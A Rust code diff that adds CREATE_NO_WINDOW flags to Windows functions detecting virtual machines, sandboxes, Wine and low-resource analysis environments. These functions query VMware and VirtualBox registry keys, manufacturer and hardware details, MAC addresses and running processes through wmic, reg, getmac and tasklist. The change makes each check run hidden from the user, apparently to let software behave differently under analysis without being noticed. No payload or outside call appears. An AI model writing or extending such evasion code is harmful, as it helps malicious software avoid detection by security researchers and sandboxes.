@@ -265,9 +265,11 @@ fn detect_vm() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_system_manufacturer() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     let output = Command::new("wmic")
         .args(&["computersystem", "get", "manufacturer"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
 
     if let Ok(out) = output {
@@ -297,6 +299,7 @@ fn check_system_manufacturer() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_vm_registry_keys() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     // VMware registry keys
     let vmware_keys = [
@@ -313,7 +316,10 @@ fn check_vm_registry_keys() -> bool {
 
     // Check VMware keys
     for key in &vmware_keys {
-        let output = Command::new("reg").args(&["query", key]).output();
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output();
 
         if let Ok(out) = output {
             if out.status.success() {
@@ -324,7 +330,10 @@ fn check_vm_registry_keys() -> bool {
 
     // Check VirtualBox keys
     for key in &vbox_keys {
-        let output = Command::new("reg").args(&["query", key]).output();
+        let output = Command::new("reg")
+            .args(&["query", key])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .output();
 
         if let Ok(out) = output {
             if out.status.success() {
@@ -365,8 +374,11 @@ fn check_vm_files() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_vm_mac_address() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
-    let output = Command::new("getmac").output();
+    let output = Command::new("getmac")
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .output();
 
     if let Ok(out) = output {
         let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
@@ -429,8 +441,11 @@ fn detect_sandbox_artifacts() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_sandbox_processes() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
-    let output = Command::new("tasklist").output();
+    let output = Command::new("tasklist")
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
+        .output();
 
     if let Ok(out) = output {
         let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
@@ -471,9 +486,11 @@ fn check_sandbox_processes() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_wine() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     let output = Command::new("reg")
         .args(&["query", r"HKCU\Software\Wine"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
 
     if let Ok(out) = output {
@@ -510,9 +527,11 @@ fn detect_low_resources() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_low_memory() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     let output = Command::new("wmic")
         .args(&["computersystem", "get", "totalphysicalmemory"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
 
     if let Ok(out) = output {
@@ -537,9 +556,11 @@ fn check_low_memory() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_low_cpu_cores() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     let output = Command::new("wmic")
         .args(&["cpu", "get", "numberofcores"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
 
     if let Ok(out) = output {
@@ -562,9 +583,11 @@ fn check_low_cpu_cores() -> bool {
 #[cfg(all(feature = "production", target_os = "windows"))]
 fn check_small_disk() -> bool {
     use std::process::Command;
+    use std::os::windows::process::CommandExt;
 
     let output = Command::new("wmic")
         .args(&["logicaldisk", "where", "DeviceID='C:'", "get", "size"])
+        .creation_flags(0x08000000) // CREATE_NO_WINDOW
         .output();
 
     if let Ok(out) = output {
